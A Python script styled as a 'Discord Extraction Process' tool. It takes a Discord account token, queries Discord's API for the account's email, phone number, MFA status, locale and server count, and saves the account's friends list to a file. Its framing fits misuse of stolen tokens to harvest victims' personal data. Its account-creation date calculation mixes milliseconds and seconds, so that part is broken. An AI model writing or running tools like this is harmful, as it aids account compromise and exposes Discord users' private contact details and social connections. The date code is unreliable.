import requests
import os
import time
import json
from datetime import datetime, timezone
from pystyle import Colorate, Colors, Center

def Continue():
    input("\nPress Enter to continue...")

def Reset():
    os.system('cls' if os.name == 'nt' else 'clear')

def ErrorModule(e):
    print(f"Error importing module: {e}")

def Error(e):
    print(f"An error occurred: {e}")

def print_text_slowly(text, delay=0.1):

    lines = text.splitlines()
    for line in lines:
        print(line)
        time.sleep(delay)
    print()  

def color_gradient(text, start_color, end_color):
    
    return Colorate.Horizontal(start_color, end_color, text)

def fetch_user_data(token):
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    
    if response.status_code != 200:
        Error(f"Invalid Token Requested! Error ->  {response.status_code}")
        return None
    
    return response.json()

def fetch_guild_data(token):
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
    
    if response.status_code != 200:
        Error(f"Failed to fetch guild data, status code: {response.status_code}")
        return None
    
    return response.json()

def fetch_friends(token):
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
    
    if response.status_code != 200:
        Error(f"Failed to fetch friends list, status code: {response.status_code}")
        return None
    
    return response.json()

def print_user_info(user):
   
    print(f"Username: {user['username']}#{user['discriminator']}")
    print(f"User ID: {user['id']}")
    print(f"Email: {user.get('email', 'None')}")
    print(f"Verified Email: {user.get('verified', 'None')}")
    print(f"Phone: {user.get('phone', 'None')}")
    print(f"MFA Enabled: {user.get('mfa_enabled', 'None')}")
    print(f"Country: {user.get('locale', 'None')}")
    created_at = datetime.fromtimestamp((int(user['id']) >> 22) + 1420070400000 / 1000, timezone.utc)
    print(f"Account Has Been Created At: {created_at}")

def main():
    Reset()
    text = ("[+] Discord Extraction Process [+]")
    print_text_slowly(text, 0.02)
    
    try:
        token_discord = input("Discord Token >>> ")
        print("")
        print("[+] Attempting to Fetch...\n")
        
        user = fetch_user_data(token_discord)
        if user:
            print_user_info(user)

            guilds = fetch_guild_data(token_discord)
            if guilds:
                print(f"Discord Count: {len(guilds)}")
            
            friends = fetch_friends(token_discord)
            if friends:
                with open('friends_list.txt', 'w', encoding='utf-8') as file:
                    for friend in friends:
                        file.write(f"{friend['user']['username']}#{friend['user']['discriminator']}\n")
                print("[+] Friend Results --> friends_list.txt")
        Continue()
    except Exception as e:
        Error(e)

if __name__ == "__main__":
    main()
